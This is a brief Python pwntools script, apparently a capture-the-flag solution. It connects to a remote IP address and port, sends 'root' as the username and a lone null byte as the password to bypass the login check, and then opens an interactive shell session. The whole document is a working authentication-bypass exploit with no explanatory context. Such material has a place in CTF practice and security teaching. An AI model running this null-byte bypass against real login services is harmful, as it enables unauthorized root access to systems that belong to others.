from pwn import *

p = remote("34.170.146.252", 43747)

p.sendlineafter(b"Username: ", b"root")
p.sendlineafter(b"Password: ", b"\x00")

p.interactive()
